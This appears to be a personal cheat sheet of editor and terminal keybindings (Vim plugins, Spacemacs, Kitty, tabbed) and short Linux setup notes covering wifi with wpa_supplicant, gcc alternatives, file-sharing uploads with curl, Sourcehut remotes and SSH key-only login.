- VimFiler
	- display dot files: .
	- make dir: K
	- new file: N
	- copy: c
	- move: m
	- rename: r
	- check keybinds: :help vimfiler-default-keymappings
- Spacevim
	- toggle vimfiler: F3 or spc f t
	- kill buffer: spc b d
	- home: spc b h
	- switch to buffer: \ 2
		- back and forth switching: spc tab
- gvim
	- guifont prompt: set guifont=*
- vim-surround
	- braces around highlighted text: Sb
	- convert ' to " : cs'"
	- {https://github.com/tpope/vim-surround, https://superuser.com/questions/875095/adding-parenthesis-around-highlighted-text-in-vim}

---------------------------------------------------------------------
Spacemacs
---------------------------------------------------------------------
- M-x : left alt + x
- split window (vertically): SPC w /
- split window (horizontall): SPC w -
- config file : SPC f e d
- toggle line numbers: SPC t n
- toggle neotree : SPC f t
- reload after modifying ~/.spacemacs : SPC f e R
- clean whitespaces: M-x whitespace-cleanup
- restart: SPC q r
- documentation at cursor: SPC m h h
- centaur-tabs
    - next tab: C-}
    - prev tab: C-{
- treemacs
    - add proj dir: C-c C-p a
    - list proj dir: C-c C-p p

---------------------------------------------------------------------
http://www.downme.xyz
---------------------------------------------------------------------
- upload
    - curl
        - curl -X PUT www.downme.xyz/api/file -F "=@foo.txt"
    - httpie
        - http -f PUT www.downme.xyz/api/file @foo.txt -b
- download
    - curl
        - curl www.downme.xyz/api/file/FqigXPc8wD -o foo.txt
    - httpie
        - http www.downme.xyz/api/file/FqigXPc8wD > foo.txt
        - http -dco foo.txt www.downme.xyz/api/file/FqigXPc8wD -b

---------------------------------------------------------------------
make and install linux software
---------------------------------------------------------------------
- ./configure && make && make install && make clean
  - if something wrong happened, try : autoreconf -ifv
    - if err related to guess : cp /usr/share/automake-1.15/config.guess ./config/config.guess
- to uninstall: make uninstall
---------------------------------------------------------------------
raspberry pi change wifi supplicant conf 
---------------------------------------------------------------------
- directory: roots/etc/wpa_supplicant

---------------------------------------------------------------------
change wpa_supplicant & reload dhcpcd
---------------------------------------------------------------------
- edit /etc/wpa_supplicant/wpa_supplicant.conf
- sudo ip link show
- sudo ip link set up wlp3s0
- reload file: sv restart dhcpcd

---------------------------------------------------------------------
setup wpa_supplicant + dhcpcd (runit)
---------------------------------------------------------------------
- sudo ln -s /etc/sv/dhcpcd /var/service
- sudo ln -s /etc/sv/wpa_supplicant /etc/service
- touch /etc/sv/wpa_supplicant/conf
    - CONF_FILE=/etc/wpa_supplicant/wpa_supplicant-wlp3s0.conf
    - WPA_INTERFACE=wlp3s0
    - OPTS=-s
- ln -s /usr/share/dhcpcd/hooks/10-wpa_supplicant /usr/lib/dhcpcd/dhcpcd-hooks
- {https://wiki.artixlinux.org/runit/NetworkConfiguration}

---------------------------------------------------------------------
change dircolors (fix unreadable dir names with permission 777)
---------------------------------------------------------------------
- dircolors -p > ~/.dircolors
- edit line : OTHER_WRITABLE 34;42 # dir that is other-writable (o+w) and not sticky
    - change to : OTHER_WRITABLE 30;41 # dir that is other-writable (o+w) and not sticky
- add to .zshrc: eval "$(dircolors ~/.dircolors)";
- {http://pygy.co/Dv}

---------------------------------------------------------------------
gcc  versions
---------------------------------------------------------------------
- sudo update-alternatives --install /usr/bin/gcc gcc /usr/bin/gcc-7 700 --slave /usr/bin/g++ g++ /usr/bin/g++-7
- sudo update-alternatives --install /usr/bin/gcc gcc /usr/bin/gcc-8 800 --slave /usr/bin/g++ g++ /usr/bin/g++-8
- {https://askubuntu.com/questions/1028601/install-gcc-8-only-on-ubuntu-18-04}

---------------------------------------------------------------------
Kitty
---------------------------------------------------------------------
- new tab: ctrl+shift+t
- close tab: ctrl+shift+q
- next tab: ctrl+shift+right
- prev tab: ctrl+shift+left
- move tab forward: ctrl+shift+.
- move tab backward: ctrl+shift+,
- rename tab: ctrl+shift+alt+t
- scroll up: ctrl+shift+up
- scroll down: ctrl+shift+down
- reload config: ctrl+shift+f5
- input unicode characters: ctrl+shift+u
- scrollback buffer: ctrl+shift+h

- new window: ctlr+shift+enter
- next window: ctrl+shift+]
- prev window: ctrl+shift+[
- close window: ctrl+shift+w
- move window to top: ctrl+shift+`
- move window forward : ctrl+shift+f
- move window backward : ctrl+shift+b
- focus window : ctrl+shift+0..9
- next layout : ctrl+shift+l
- resize window: ctrl+shift+r

- new terminal : ctrl+shift+n

- ssh: kitty +kitten ssh user@host
- view image: kitty +kitten icat image.jpeg
- diff files: kitty +kitten diff file1 file2

- type emojis: ctrl+shift+u

- kittens: {https://wiki.archlinux.org/title/kitty,https://sw.kovidgoyal.net/kitty/kittens_intro/}


---------------------------------------------------------------------
tabbed
---------------------------------------------------------------------
- tabbed terminals: tabbed -c alacritty --embed
- new tab: ctrl + shift + enter
- previous tab: ctrl + shift + h
- next tab: ctrl + shift + l
- move tab to left: ctrl + shift + j
- move tab to right: ctrl + shift + k
- close tab: ctrl+q

---------------------------------------------------------------------
Sourcehut (sr.ht)
---------------------------------------------------------------------
- push to repo:
  - set remote url:
    - add: git remote add srht git@git.sr.ht:~ac5tin/foobar
    - update: git remote set-url srht git@git.sr.ht:~ac5tin/foobar
  - generate ssh key: ssh-keygen
  - copy contents of ~/.ssh/id_rsa.pub and add as key
  - {https://man.sr.ht/tutorials/set-up-account-and-git.md}

---------------------------------------------------------------------
Linux set ssh key login only
---------------------------------------------------------------------
- generate ssh key on local machine
- copy key to target server
    - ssh-copy-id user@host
- disable password login
    - edit /etc/ssh/sshd_config
    - change PasswordAuthentication to no
- restart ssh service
    - sudo systemctl restart sshd

- https://www.digitalocean.com/community/tutorials/how-to-configure-ssh-key-based-authentication-on-a-linux-server

---------------------------------------------------------------------
TEMPLATE
---------------------------------------------------------------------
---------------------------------------------------------------------
TEMPLATE
---------------------------------------------------------------------
---------------------------------------------------------------------
TEMPLATE
---------------------------------------------------------------------
---------------------------------------------------------------------
TEMPLATE
---------------------------------------------------------------------
---------------------------------------------------------------------
TEMPLATE
---------------------------------------------------------------------
